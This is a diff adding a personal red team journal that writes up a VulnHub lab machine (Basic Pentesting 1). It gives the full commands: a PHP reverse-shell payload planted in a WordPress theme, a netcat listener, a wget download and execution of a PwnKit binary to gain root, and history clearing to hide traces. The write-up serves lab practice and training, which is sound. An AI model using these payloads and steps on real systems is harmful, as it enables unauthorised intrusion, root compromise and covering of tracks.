@@ -1,0 +1,113 @@
+
+## Red Team Journal – June 15, 2025
+
+## 🖥️ Target: VulnHub – Basic Pentesting 1  
+
+### Engagement Overview
+**Target:** Basic Pentesting 1 (VulnHub)  
+**Box IP:** 192.168.56.102  
+**Attacker IP:** 192.168.56.10  
+**Methodology:** Web enumeration → WordPress admin access → reverse shell → privesc via CVE-2021-4034 (PwnKit)  
+
+---
+
+### Objectives
+- [x] Regain WordPress admin access
+- [x] Inject PHP reverse shell via theme
+- [x] Get reverse shell to Kali
+- [x] Upgrade to interactive TTY
+- [x] Enumerate for privilege escalation vectors
+- [x] Exploit PwnKit to gain root
+- [x] Clean up artifacts
+
+---
+
+### Initial Foothold
+
+**Method:** PHP Reverse Shell via `404.php` in theme
+  
+**Payload used:**
+
+	<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'"); ?>
+
+Triggered with:
+
+	curl "http://vtcsec/secret/wp-content/themes/twentyseventeen/404.php"
+
+**Listener setup on Kali:**
+
+	nc -lvnp 4444
+
+Result:
+Gained shell as www-data.
+
+**Enumeration Highlights**
+
+	uname -a
+	cat /etc/os-release
+	ls /home
+	sudo -l
+	find / -perm -4000 -type f 2>/dev/null
+
+**Key Findings:**
+
+    OS: Ubuntu 16.04.3 LTS
+
+    Kernel: 4.10.0-28-generic
+
+    Local user: marlinspike
+
+    No sudo access from www-data
+
+    SUID binary found: /usr/bin/pkexec (used by PwnKit)
+
+**Privilege Escalation**
+
+Exploit: CVE-2021-4034 (PwnKit)
+Approach: Static binary hosted on attacker machine
+
+On Kali:
+
+	python3 -m http.server 8000
+
+On Target:
+
+	cd /tmp
+	wget http://192.168.56.10:8000/PwnKit -O PwnKit
+	chmod +x PwnKit
+	./PwnKit
+
+Result:
+
+	root@vtcsec:/tmp# whoami
+	root
+
+**Cleanup Actions**
+
+	rm /tmp/PwnKit
+	history -c
+
+Root shell obtained.
+No persistence or root flag grabbed — purpose was shell lifecycle practice.
+
+
+**Tools Utilized**
+
+* nmap, gobuster, wpscan
+* curl, netcat, wget, python3
+* Metasploit (for ProFTPD attempt)
+* Static PwnKit binary
+
+**Key Takeaways**
+
+* Always check /wp-login.php and XML-RPC for exposed WordPress logins
+* Use encoded curl payloads to bypass broken command injection
+* Static precompiled binaries save time vs. build errors (GLIBC mismatch)
+* Do not use fg without setting proper terminal (stty raw -echo)
+* After shell access, use enumeration before brute forcing — privilege escalation often lives in defaults
+
+
+
+<!--stackedit_data:
+eyJoaXN0b3J5IjpbLTE2MTU4NTY1NTddfQ==
+-->
